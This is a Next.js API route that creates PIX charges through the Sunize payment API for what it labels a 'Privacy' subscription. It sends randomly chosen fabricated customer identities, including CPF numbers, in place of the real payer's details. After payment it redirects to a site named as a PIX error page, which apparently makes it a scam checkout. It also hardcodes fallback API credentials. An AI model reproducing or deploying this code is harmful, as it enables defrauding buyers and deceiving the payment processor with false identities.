import { type NextRequest, NextResponse } from "next/server"

const PREDEFINED_CUSTOMERS = [
  {
    name: "João Silva Santos",
    email: "joao.silva@email.com",
    phone: "+5511987654321",
    document: "12345678909",
  },
  {
    name: "Maria Oliveira Costa",
    email: "maria.oliveira@email.com",
    phone: "+5511976543210",
    document: "98765432100",
  },
  {
    name: "Carlos Eduardo Lima",
    email: "carlos.lima@email.com",
    phone: "+5511965432109",
    document: "11122233344",
  },
]

function getRandomCustomer() {
  const randomIndex = Math.floor(Math.random() * PREDEFINED_CUSTOMERS.length)
  return PREDEFINED_CUSTOMERS[randomIndex]
}

function normalizeToReais(value: unknown): number {
  if (value == null) return 19.9 // default: R$ 19,90

  let num: number

  if (typeof value === "string") {
    let s = value.trim()
    if (s === "") throw new Error("Valor de amount vazio")

    // Se tiver vírgula, assumimos formatação BR: remover milhares '.' e trocar ',' por '.'
    if (s.includes(",")) {
      s = s.replace(/\./g, "").replace(",", ".")
    }
    num = Number(s)
    if (!Number.isFinite(num)) throw new Error(`Valor inválido para amount: ${value}`)
  } else if (typeof value === "number") {
    if (!Number.isFinite(value)) throw new Error(`Valor inválido para amount: ${value}`)
    num = value
  } else {
    throw new Error(`Tipo inválido para amount: ${typeof value}`)
  }

  // Se o valor for maior que 100 e for um número inteiro, assumimos que está em centavos
  if (num >= 100 && Number.isInteger(num)) {
    return num / 100 // Convert centavos to reais
  }

  // Caso contrário, assumimos que já está em reais
  return Math.round((num + Number.EPSILON) * 100) / 100
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    console.log("[v0] Request body received:", JSON.stringify(body, null, 2))

    const clientKey = process.env.SUNIZE_KEY || "ck_c9fb71cf7a95dbe44cf5aeacb39e599f"
    const clientSecret = process.env.SUNIZE_SECRET || "cs_00ca44a3a269c0b6c42cdb75998a7021"

    console.log("[API] Iniciando requisição PIX para Sunize...")

    const selectedCustomer = getRandomCustomer()
    console.log("[v0] Cliente selecionado:", selectedCustomer.name)

    const amountInReais = normalizeToReais(body.amount)
    console.log("[SUNIZE] raw amount:", body.amount, "type:", typeof body.amount)
    console.log("[SUNIZE] amount (reais):", amountInReais)

    const transactionData = {
      external_id: `transaction_${Date.now()}`,
      total_amount: amountInReais,
      payment_method: "PIX",
      items: [
        {
          id: `item_${Date.now()}`,
          title: body.description || "Assinatura Privacy",
          description: body.description || "Pagamento Privacy",
          price: amountInReais,
          quantity: 1,
          is_physical: false,
        },
      ],
      ip: request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "127.0.0.1",
      customer: {
        name: selectedCustomer.name,
        email: selectedCustomer.email,
        phone: selectedCustomer.phone,
        document_type: "CPF",
        document: selectedCustomer.document,
      },
    }

    console.log("[v0] JSON final enviado para Sunize:", JSON.stringify(transactionData, null, 2))

    const response = await fetch("https://api.sunize.com.br/v1/transactions", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": clientKey,
        "x-api-secret": clientSecret,
        Accept: "application/json",
      },
      body: JSON.stringify(transactionData),
    })

    console.log(`[v0] Response status: ${response.status}`)
    console.log(`[v0] Response headers:`, Object.fromEntries(response.headers.entries()))

    if (!response.ok) {
      const errorText = await response.text()
      console.log(`[v0] Erro ${response.status} - Response body:`, errorText)

      try {
        const errorJson = JSON.parse(errorText)
        console.log("[v0] Parsed error:", JSON.stringify(errorJson, null, 2))
      } catch (e) {
        console.log("[v0] Could not parse error as JSON")
      }

      return NextResponse.json(
        {
          error: `Erro da API Sunize: ${response.status} - ${errorText}`,
        },
        { status: response.status },
      )
    }

    const result = await response.json()
    console.log("[v0] Sucesso - Response completa:", JSON.stringify(result, null, 2))

    const responseWithRedirect = {
      ...result,
      redirect_url: "https://erropixpvc.vercel.app/",
    }

    return NextResponse.json(responseWithRedirect)
  } catch (error) {
    console.error("[v0] Erro geral:", error)
    return NextResponse.json(
      { error: error instanceof Error ? error.message : "Erro interno do servidor" },
      { status: 500 },
    )
  }
}
